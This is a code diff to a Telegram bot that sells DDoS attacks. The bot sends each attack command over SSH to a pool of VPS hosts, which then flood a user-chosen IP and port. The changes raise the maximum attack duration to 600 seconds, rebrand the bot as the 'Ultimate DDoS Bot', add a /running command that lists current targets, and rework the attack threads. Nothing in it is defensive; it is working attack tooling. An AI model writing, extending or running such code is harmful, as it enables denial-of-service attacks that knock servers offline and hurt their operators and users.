@@ -42,7 +42,7 @@ ALLOWED_GROUP_IDS = [-1002201895980]
 MAX_THREADS = 1000
 max_duration = 120
 bot_open = False
-SPECIAL_MAX_DURATION = 240
+SPECIAL_MAX_DURATION = 600
 SPECIAL_MAX_THREADS = 2000
 BOT_START_TIME = time.time()
 
@@ -108,7 +108,7 @@ START_IMAGES = [
     {
         'url': 'https://files.oaiusercontent.com/file-HwjNJUPmaJcdkPdJESzKV6?se=2025-04-22T18%3A35%3A31Z&sp=r&sv=2024-08-04&sr=b&rscc=max-age%3D299%2C%20immutable%2C%20private&rscd=attachment%3B%20filename%3D366e5d97-0495-474b-aa2f-479b8121e6b5.png&sig=QIl2qCj9A7uMnw1yxtkh2mPcEd/GPi5meibwRGAdsuA%3D',
         'caption': (
-            '🔥 *Welcome to the DEMON MULTIPLE DDoS Bot !*' + '\n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot !*' + '\n\n'
             '💻 *Example:* `20.235.43.9 14533 120 100`' + '\n\n'
             '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad*' + '\n\n'
             '⚠️ *🥰🥰🥰🥰🥰🥰🥰🥰🥰🥰🤬*⚠️' + '\n\n'
@@ -972,6 +972,35 @@ async def add_owner_username(update: Update, context: CallbackContext):
         parse_mode='MarkdownV2'
     )
     return ConversationHandler.END
+    
+async def show_running_attacks(update: Update, context: CallbackContext):
+    if not running_attacks:
+        await update.message.reply_text("ℹ️ No attacks currently running", parse_mode='Markdown')
+        return
+    
+    message = "🔥 *Currently Running Attacks:*\n\n"
+    unique_targets = {}  # Track unique targets to avoid duplicates
+    
+    for attack_id, attack_info in running_attacks.items():
+        target = attack_id.split('-')[0]  # Extract IP:Port (assuming format is "IP:PORT-UUID")
+        
+        # If target already processed, skip
+        if target in unique_targets:
+            continue
+        
+        # Store target to avoid duplicates
+        unique_targets[target] = True
+        
+        elapsed = int(time.time() - attack_info['start_time'])
+        remaining = max(0, attack_info['duration'] - elapsed)
+        
+        message += (
+            f"🎯 Target: `{target}`\n"
+            f"⏱️ Elapsed: `{elapsed}s` | Remaining: `{remaining}s`\n"
+            f"🧵 Threads: `{SPECIAL_MAX_THREADS if attack_info['is_special'] else MAX_THREADS}`\n\n"
+        )
+    
+    await update.message.reply_text(message, parse_mode='Markdown')
 
 async def remove_bot_instance(update: Update, context: CallbackContext):
     """Remove a bot instance"""
@@ -1573,14 +1602,16 @@ async def attack_input(update: Update, context: CallbackContext):
         f"🕒 *Duration*: {duration} sec\n"
         f"🧵 *Total Power*: {threads} threads\n"
         f"👑 *Bot Owner:* {current_display_name}\n\n"
-        f"🔥 *ATTACK STARTED!* 💥",
+        f"🔥 *ATTACK STARTED! /running * 💥",
         parse_mode='Markdown'
     )
 
-    async def execute_ssh_attack(vps, threads_for_vps, attack_num):
-        """Execute SSH attack in a separate thread to prevent blocking"""
+    def _run_ssh_attack(vps, threads_for_vps, attack_num, context):
+        """Synchronous SSH attack function to be run in thread"""
         ip_vps, username, password = vps
         attack_id_vps = f"{attack_id}-{attack_num}"
+        
+        # Register this attack
         running_attacks[attack_id_vps] = {
             'user_id': user_id,
             'start_time': time.time(),
@@ -1589,30 +1620,6 @@ async def attack_input(update: Update, context: CallbackContext):
             'vps_ip': ip_vps
         }
         
-        try:
-            # Use ThreadPoolExecutor for blocking SSH operations
-            loop = asyncio.get_event_loop()
-            await loop.run_in_executor(
-                None,  # Uses default executor (ThreadPoolExecutor)
-                lambda: _run_ssh_attack(
-                    ip_vps, username, password, 
-                    ip, port, duration, threads_for_vps
-                )
-            )
-            
-            if attack_id_vps in running_attacks:
-                del running_attacks[attack_id_vps]
-                
-            logging.info(f"Attack finished on VPS {ip_vps}")
-            
-        except Exception as e:
-            logging.error(f"Error executing attack on VPS {ip_vps}: {str(e)}")
-            if attack_id_vps in running_attacks:
-                del running_attacks[attack_id_vps]
-            raise
-
-    def _run_ssh_attack(ip_vps, username, password, target_ip, target_port, duration, threads):
-        """Synchronous SSH attack function to be run in thread"""
         ssh = None
         try:
             ssh = paramiko.SSHClient()
@@ -1623,7 +1630,7 @@ async def attack_input(update: Update, context: CallbackContext):
             transport = ssh.get_transport()
             transport.set_keepalive(30)
             
-            command = f"{BINARY_PATH} {target_ip} {target_port} {duration} {threads}"
+            command = f"{BINARY_PATH} {ip} {port} {duration} {threads_for_vps}"
             stdin, stdout, stderr = ssh.exec_command(command, timeout=60)
             
             # Wait for command to complete or timeout
@@ -1633,51 +1640,54 @@ async def attack_input(update: Update, context: CallbackContext):
                     break
                 time.sleep(1)
             
+            logging.info(f"Attack finished on VPS {ip_vps}")
+            
         except Exception as e:
             logging.error(f"SSH error on {ip_vps}: {str(e)}")
-            raise
         finally:
             if ssh:
                 try:
                     ssh.close()
                 except:
                     pass
+            
+            # Remove from running attacks when done
+            if attack_id_vps in running_attacks:
+                del running_attacks[attack_id_vps]
+            
+            # Check if all attacks for this target are done
+            active_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
+            if not active_attacks:
+                # All attacks finished for this target
+                asyncio.run_coroutine_threadsafe(
+                    context.bot.send_message(
+                        chat_id=update.effective_chat.id,
+                        text=f"✅ *Attack Finished!*\n"
+                             f"🎯 *Target*: {ip}:{port}\n"
+                             f"🕒 *Duration*: {duration} sec\n"
+                             f"🧵 *Total Power*: {threads} threads\n"
+                             f"👑 *Bot Owner:* {current_display_name}\n\n"
+                             f"🔥 *ATTACK COMPLETED!*",
+                        parse_mode='Markdown'
+                    ),
+                    context.bot.application.event_loop
+                )
 
     try:
-        # Limit concurrent VPS connections to prevent overload
-        max_concurrent = min(ACTIVE_VPS_COUNT, 5)  # Adjust based on your server capacity
-        semaphore = asyncio.Semaphore(max_concurrent)
-        
-        async def run_attack_with_limit(vps, threads_for_vps, attack_num):
-            async with semaphore:
-                return await execute_ssh_attack(vps, threads_for_vps, attack_num)
-        
-        # Distribute threads among VPS
-        tasks = []
+        # Start a thread for each VPS
         for i, vps in enumerate(VPS_LIST[:ACTIVE_VPS_COUNT]):
             threads_for_vps = threads_per_vps + (1 if i < remaining_threads else 0)
             if threads_for_vps > 0:
-                tasks.append(run_attack_with_limit(vps, threads_for_vps, i))
-        
-        # Run attacks with limited concurrency
-        await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # Send completion message
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-        await update.message.reply_text(
-            f"✅ *Attack Finished!*\n"
-            f"🎯 *Target*: {ip}:{port}\n"
-            f"🕒 *Duration*: {duration} sec\n"
-            f"🧵 *Total Power*: {threads} threads\n"
-            f"👑 *Bot Owner:* {current_display_name}\n\n"
-            f"🔥 *ATTACK COMPLETED!*",
-            parse_mode='Markdown'
-        )
+                threading.Thread(
+                    target=_run_ssh_attack,
+                    args=(vps, threads_for_vps, i, context),
+                    daemon=True
+                ).start()
         
     except Exception as e:
-        logging.error(f"Error during attack: {str(e)}")
+        logging.error(f"Error starting attack threads: {str(e)}")
         await update.message.reply_text(
-            f"❌ *Error during attack!*\n"
+            f"❌ *Error starting attack!*\n"
             f"Error: {str(e)}\n\n"
             f"👑 *Bot Owner:* {current_display_name}",
             parse_mode='Markdown'
@@ -3273,6 +3283,7 @@ def main():
     application.add_handler(stop_bot_handler)
     application.add_handler(delete_binary_handler)
     application.add_handler(set_vps_handler)
+    application.add_handler(CommandHandler("running", show_running_attacks))
     application.add_handler(CommandHandler("listbots", show_bot_list_cmd))
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
